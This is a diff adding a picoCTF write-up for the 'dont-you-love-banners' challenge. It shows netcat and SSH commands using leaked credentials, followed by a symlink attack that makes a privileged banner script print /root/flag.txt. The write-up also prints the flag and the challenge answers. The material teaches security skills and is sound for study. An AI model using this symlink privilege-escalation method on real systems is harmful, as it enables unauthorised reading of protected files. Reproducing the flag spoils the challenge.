@@ -1,0 +1,112 @@
+# dont-you-love-banners
+
+**Platform:** picoCTF  
+**Category:** General Skills  
+**Difficulty:** Medium  
+
+## Description
+Can you abuse the banner? The server has been leaking 
+some crucial information on tethys.picoctf.net 55257. 
+Use the leaked information to get to the server.
+
+Connect to the running application:
+nc tethys.picoctf.net 61290
+
+Find the flag in the /root directory.
+
+## Approach
+The challenge involves three stages — extracting leaked 
+credentials from a banner, using those credentials to 
+SSH into the server, then exploiting a symlink 
+vulnerability to read a file you don't have permission 
+to access directly.
+
+## Solution
+
+### Step 1 — Leak Credentials via Banner
+Connected to the application with netcat to see what 
+information the server was leaking.
+
+```bash
+nc tethys.picoctf.net 61290
+```
+
+The banner script asked a series of questions. By reading 
+the source code found at script.py the correct answers were:
+
+- Password: MY_PASSW0RD_1234
+- Top cybersecurity conference: DEFCON
+- First hacker known for phreaking: JOHN DRAPER
+
+Answering correctly granted SSH access as user player.
+
+### Step 2 — SSH into the Server
+Used the leaked credentials to connect via SSH.
+
+```bash
+ssh -p 55257 player@tethys.picoctf.net
+```
+
+Password: MY_PASSW0RD_1234
+
+### Step 3 — Enumerate Permissions
+Once connected checked the current user and available 
+privileges.
+
+```bash
+id
+whoami
+sudo -l
+```
+
+Output showed:
+- Running as player (uid=1000)
+- sudo was not available
+- flag.txt in /root was owned by root with permissions 
+  -rw------- meaning only root could read it directly
+
+### Step 4 — Symlink Exploitation
+The banner script reads from /home/player/banner to 
+display the welcome message. By replacing the banner 
+file with a symlink pointing to /root/flag.txt the 
+script would read and display the flag instead of 
+the banner when it executed with elevated privileges.
+
+```bash
+cd /home/player
+ln -sf /root/flag.txt /home/player/banner
+```
+
+### Step 5 — Trigger the Banner Read
+Reconnected via netcat which caused the script to 
+execute and read the banner file. Since banner now 
+pointed to flag.txt via the symlink the flag was 
+displayed in the output.
+
+```bash
+nc tethys.picoctf.net 61290
+```
+
+## Commands Used
+```bash
+nc tethys.picoctf.net 61290
+ssh -p 55257 player@tethys.picoctf.net
+id
+whoami
+sudo -l
+ls -la
+cd /home/player
+ln -sf /root/flag.txt /home/player/banner
+nc tethys.picoctf.net 61290
+```
+
+## Flag
+picoCTF{b4nn3r_gr4bb1n9_su((3sfu11y_f7608541}
+
+
+## What I Learned
+How to perform a symlink attack to read files beyond 
+your permission level, how to extract credentials from 
+a leaky banner service, and how to enumerate a Linux 
+system to find privilege escalation paths when sudo 
+is unavailable.
